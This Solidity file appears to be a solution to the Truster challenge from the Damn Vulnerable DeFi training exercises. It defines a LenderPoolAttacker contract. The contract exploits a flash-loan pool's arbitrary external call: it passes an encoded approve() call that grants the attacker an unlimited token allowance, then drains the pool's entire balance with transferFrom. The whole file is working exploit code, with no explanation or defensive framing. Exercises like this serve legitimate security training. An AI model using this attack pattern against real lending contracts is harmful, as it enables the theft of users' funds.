// SPDX-License-Identifier: GPL-2.0+
pragma solidity ^0.8.3;
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";
interface ITrusterLenderPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
    external;

}
contract LenderPoolAttacker {
    IERC20 public immutable damnValuableToken;
    ITrusterLenderPool public lenderPool;
    constructor(address tokenAddress, address pool) {
        damnValuableToken = IERC20(tokenAddress);
        lenderPool = ITrusterLenderPool(pool);
    }

    function attack() public {
        console.log(msg.sender);
        lenderPool.flashLoan(0, address(this), address(damnValuableToken),
                    abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max));
        damnValuableToken.transferFrom(address(lenderPool), msg.sender, damnValuableToken.balanceOf(address(lenderPool)));
        require(damnValuableToken.balanceOf(address(lenderPool)) == 0);
        require(damnValuableToken.balanceOf(msg.sender) > 0);
    }
}
